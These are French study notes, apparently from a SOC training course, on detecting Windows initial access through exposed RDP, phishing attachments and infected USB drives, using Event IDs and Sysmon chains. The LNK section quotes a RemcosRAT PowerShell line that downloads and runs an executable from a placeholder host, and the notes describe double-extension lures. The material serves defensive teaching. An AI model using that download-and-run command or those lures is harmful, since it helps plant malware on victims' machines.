## Intro to Initial Access

### Initial Access

Premier pas d'un attaquant : obtenir l'accès initial à la machine cible.

Deux grandes catégories :

### Exposed Services

![[exposed_services.png]]

Chaque service exposé sur Internet = surface d'attaque. Les bots scannent en continu ports ouverts, mots de passe faibles et vulnérabilités non patchées.

|Technique MITRE|Description|
|---|---|
|T1133 – External Remote Services|RDP/VNC/SSH exposés avec mots de passe faibles|
|T1190 – Exploit Public-Facing Application|Sites/applis mal configurés ou vulnérables|

### User-Driven Methods

![[user_driven_methods.png]]

Machine non exposée ≠ machine sûre. Les utilisateurs restent le maillon faible.

|Technique MITRE|Description|
|---|---|
|T1566 – Phishing|Liens/pièces jointes malveillants, l'utilisateur exécute lui-même le malware|
|T1091 – Removable Media|Clé USB infectée propagée de PC en PC|

### Usage by Threat Actors

Les groupes ransomware (ex. Medusa, Akira) combinent toutes ces techniques dans leurs campagnes. En tant que SOC analyst, toutes les méthodes décrites sont à surveiller.

---

## Initial Access via RDP

### Risks of Exposed RDP

RDP exposé + mot de passe faible = compromission en quelques jours. Plus de 5 000 000 machines RDP exposées sur Internet (https://platform.censys.io/search?q=host.services.protocol%3A%22RDP%22). RDP souvent surnommé "Ransomware Deployment Protocol" par les défenseurs.

### Detecting RDP Breach

Fichier de log : `C:\Users\Administrator\Desktop\Practice\RDP Case\RDP-Security.evtx`

|Étape|Action de détection|
|---|---|
|RDP Brute Force|Event ID **4625** (échec login) + Logon Type **3 ou 10** + IP externe (champ Source IP)|
|Initial Access|Event ID **4624** (login réussi) + même filtres → identifier le compte compromis|
|Actions post-accès|Event ID **4624** + Logon Type **10** → copier le **Logon ID** → chercher ce Logon ID dans les logs **Sysmon** → voir tous les processus lancés par l'attaquant|

**Logon Types utiles :**

- `3` = Remote logon (réseau)
- `10` = Interactive RDP

### Logging Brute Force

Un serveur RDP exposé génère des centaines d'events **4625** en quelques minutes — détectable immédiatement.

> RDP peut aussi être compromis sans brute force si les credentials sont déjà connus (credential stuffing, leaks).

https://socradar.io/blog/rdp-access-sales-on-dark-web-forums-detected-by-socradar/

---

## Initial Access via Phishing

### Current State of Phishing

Phishing non bloquable comme RDP (passe le firewall via l'utilisateur). +4100% d'attaques depuis ChatGPT (2022). Deux techniques principales : **binaires malveillants** et **LNK attachments**.

### Binary Attachments

Windows cache les extensions connues par défaut → `invoice.pdf.exe` s'affiche comme `invoice.pdf`.

Extensions exécutables souvent ignorées par les utilisateurs :

`.exe` `.com` `.scr` `.cpl`

Techniques d'abus :

- Nommage trompeur : `invoice.pdf.exe`, `cat.png.com`
- Icône modifiée pour coller au contexte
- `.com` particulièrement piégeux (`tryhatme.com` ressemble à une URL)

### LNK Attachments

Fichier `.lnk` (raccourci Windows) dont le champ **Target** contient une commande arbitraire (PowerShell, VBS, BAT) au lieu d'un chemin légitime. Permet de contourner l'AV.

Vérification manuelle : clic droit → Propriétés → onglet **Raccourci** → champ **Cible**

Exemple de payload LNK réel (RemcosRAT) :

powershell

```powershell
powershell.exe -c
# Télécharge le malware encodé
(New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe');
# Exécute le malware
start C:\\ProgramData\\r.exe;
```

---

## Continuing Phishing Topic

### Detecting Malicious Download

Chaîne Sysmon pour une pièce jointe avec double extension :

yaml

```yaml
# Event ID 1 - Navigateur lancé
Image: msedge.exe
ParentImage: Explorer.EXE

# Event ID 11 - Archive téléchargée
Image: msedge.exe
TargetFilename: C:\Users\User\Downloads\invoice.zip

# Event ID 11 - Extraction de l'archive
Image: Explorer.EXE (ou 7zG.exe)
TargetFilename: C:\Users\User\Downloads\invoice.pdf.exe

# Event ID 1 - Fichier exécuté par l'utilisateur
Image: invoice.pdf.exe
ParentImage: Explorer.EXE
```

### Notes on LNK Attachments

LNK laisse peu de traces d'exécution : Windows fait apparaître `explorer.exe` comme parent direct de PowerShell, masquant l'origine réelle.

**Détection** : chercher un Event ID **11** (file creation) précédant l'exécution → le fichier `.lnk` doit être apparu dans `Downloads` avant d'être lancé.

---

## Initial Access via USB

### Risks of Removable Media

USB infectée bypass le firewall comme le phishing, fonctionne sans Internet et peut se propager sans interaction utilisateur. Toujours d'actualité (ex : Camaro Dragon, Raspberry Robin).

### USB Delivery Case

Scénario classique : USB physiquement livrée (package, cadeau HR, etc.), l'utilisateur la branche lui-même → malware exécuté en arrière-plan pendant qu'une distraction (GIF, document) est affichée.

### Print Service Case

USB confiée à un tiers (imprimerie, etc.) déjà infecté → worm se copie sur la clé → l'utilisateur ramène le malware chez lui.

### Detecting an Infected USB

Techniques courantes de camouflage sur USB :

- Fichier `RECOVERY.lnk` (les vrais fichiers sont cachés)
- `Photos.exe` avec icône de dossier
- Double extension : `photo_2024_1_12.jpg.exe`

**Détection** : identique aux pièces jointes phishing (parent = `explorer.exe`). Indicateur clé d'une origine USB : chemin d'exécution depuis un lecteur externe.

```
E:\malware.exe
```

Chercher dans Sysmon Event ID **1** un `Image` pointant vers une lettre de lecteur externe (E:, F:, G:…).

---

## Résumé — Windows Threat Detection 1 : Initial Access

### Concepts fondamentaux

Trois vecteurs d'Initial Access à maîtriser en SOC :

|Vecteur|Bypass Firewall|Sans Internet|Interaction utilisateur|
|---|---|---|---|
|RDP exposé|Non|Non|Non|
|Phishing|Oui|Non|Oui|
|USB infectée|Oui|Oui|Oui|

### Ce qu'il faut retenir par vecteur

**RDP**

- Event ID `4625` + Logon Type 3/10 + IP externe → brute force
- Event ID `4624` + Logon Type 10 → accès réussi
- Logon ID commun entre Security logs et Sysmon → retracer les actions post-accès

**Phishing**

- Windows cache les extensions par défaut → `invoice.pdf.exe` affiché comme `invoice.pdf`
- LNK : parent affiché = `explorer.exe`, peu de traces → chercher Event ID **11** dans Downloads avant l'exécution
- Chaîne Sysmon : ID 11 (download) → ID 11 (extraction) → ID 1 (exécution par Explorer)

**USB**

- Détection quasi identique au phishing
- Indicateur clé : chemin d'exécution depuis lecteur externe (`E:\`, `F:\`…) dans Sysmon Event ID **1**

### Réflexes SOC à ancrer

- Toujours corréler Security logs + Sysmon via le **Logon ID**
- LNK et USB sont les vecteurs les plus discrets → chercher les **file creation events** en amont
- Un `ParentImage: Explorer.EXE` ne suffit pas à distinguer phishing de USB → regarder le chemin complet de l'`Image`
- RDP exposé = détectable passivement (flood de `4625` en quelques minutes)

---

